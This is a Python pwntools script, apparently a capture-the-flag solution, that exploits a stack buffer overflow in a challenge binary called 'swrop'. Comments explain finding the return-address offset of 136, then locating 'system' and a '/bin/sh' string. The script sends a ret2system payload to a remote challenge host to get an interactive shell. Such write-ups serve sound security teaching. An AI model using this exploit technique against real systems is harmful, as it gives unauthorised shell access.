#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# This binary simply calls 'read', attempting to read up to 0x100 bytes from stdin
# into a buffer. If we run the program in gdb, and pass in a cyclic sequence of
# length 300, it displays 'Invalid address 0x6261616a'. Using cyclic -l '0x6261616a',
# we determine this is at offset 136. Hence, this is the offset of the return address.

# Given this, we want to overwrite the return address to jump to another function.
# Looking in binary ninja, the function 'not_call' calls the library function 'system',
# which is the function we need to pop a shell. If a library function is used anywhere
# in a binary, then we can call this function directly using its GOT address (without
# having to access libc). Hence, looking in binary ninja shows the address of the
# 'system' function is 0x8048390 (with this simply jumping to the GOT table to find
# the real 'system' function).

# When calling 'system', if we want to pop a shell then we need to pass it the
# argument 'bin/sh'. To find if this string exists in the binary itself, we do:
# ropper -f challenges/swrop --string '/bin/sh' which gives us the address 0x080485f0.

# Now that we have our function and its argument, we can simply construct our payload
# containing these and place it at the offset of the return address.

# The script:
p = remote("plsdonthaq.me", 6001)

# Our payload consists of the 'system' function which we want to jump to,
# followed by the return address for 'system' (can be anything as we don't return),
# and finally the first argument for 'system' (being a pointer to the string /bin/sh).
payload = (
    p32(0x8048390) +
    b"XXXX" +
    p32(0x080485f0)
)

# We then send this payload at offset 136, overwriting the return address.
p.sendline(flat({
 136: payload
}))

# Now we have popped a shell, we can access the flag.
p.interactive()